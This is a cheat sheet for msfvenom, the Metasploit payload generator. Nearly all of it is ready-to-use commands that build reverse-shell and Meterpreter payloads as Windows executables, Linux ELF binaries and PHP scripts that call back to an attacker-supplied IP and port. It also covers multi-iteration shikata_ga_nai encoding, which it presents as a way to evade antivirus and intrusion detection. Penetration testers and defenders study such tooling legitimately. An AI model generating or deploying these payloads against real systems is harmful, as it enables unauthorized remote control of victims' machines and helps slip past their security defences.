## **MSFvenom Cheat Sheet**

**Description:**
`msfvenom` is a powerful command-line utility within the Metasploit Framework. It's used to generate and encode payloads. Essentially, it combines the functionalities of `msfpayload` (for generating payloads) and `msfencode` (for encoding payloads to bypass security measures like antivirus software). `msfvenom` allows you to create various types of malicious code, known as "payloads," in different formats (e.g., EXE, DLL, raw shellcode) and for various architectures and operating systems.

**Key Features:**
* **Payload Generation:** Creates malicious code (payloads) that perform actions on a target system, such as opening a reverse shell or Meterpreter session.
* **Encoding:** Obfuscates payloads to evade detection by antivirus software and intrusion detection systems (IDS).
* **Format Flexibility:** Supports various output formats for generated payloads (e.g., Windows executables, Linux ELF binaries, raw shellcode, scripting languages).
* **Architecture Support:** Generates payloads for different architectures (x86, x64, ARM, etc.).

**Common `msfvenom` Commands:**

1.  **List Payloads:**
    ```bash
    msfvenom -l payloads
    ```
    *Lists all available payloads.*

2.  **List Encoders:**
    ```bash
    msfvenom -l encoders
    ```
    *Lists all available encoders.*

3.  **Generate a Windows Reverse TCP Meterpreter Payload (EXE):**
    ```bash
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f exe -o payload.exe
    ```
    * `-p`: Specifies the payload to use.*
    * `LHOST`: Your local IP address for the reverse connection.*
    * `LPORT`: Your local port for the reverse connection.*
    * `-f`: Specifies the output format (e.g., `exe`, `dll`, `raw`, `elf`).*
    * `-o`: Specifies the output file name.*

4.  **Generate a Linux Reverse TCP Shell Payload (ELF):**
    ```bash
    msfvenom -p linux/x64/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f elf -o payload.elf
    ```

5.  **Generate a PHP Reverse Shell:**
    ```bash
    msfvenom -p php/reverse_php LHOST=<Your_IP> LPORT=<Your_Port> -f raw -o shell.php
    ```

6.  **Generate a Meterpreter Payload with Encoding (multiple iterations):**
    ```bash
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f exe -e x86/shikata_ga_nai -i 10 -o encoded_payload.exe
    ```
    * `-e`: Specifies the encoder to use.*
    * `-i`: Number of encoding iterations.*
    * `x86/shikata_ga_nai`: A common and effective encoder.*

7.  **Exclude Bad Characters:**
    ```bash
    msfvenom -p windows/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f raw -b '\x00\x0a\x0d' -o shellcode.bin
    ```
    * `-b`: Specifies bad characters to exclude from the payload (e.g., null byte `\x00`, newline `\x0a`, carriage return `\x0d`). Useful for avoiding breaking shellcode in certain contexts.*

8.  **Generate a Payload for a Specific Architecture and Platform:**
    ```bash
    msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows LHOST=<Your_IP> LPORT=<Your_Port> -f exe -o payload_x86.exe
    ```
    * `-a`: Specifies the architecture (e.g., `x86`, `x64`).*
    * `--platform`: Specifies the operating system platform (e.g., `windows`, `linux`, `osx`).*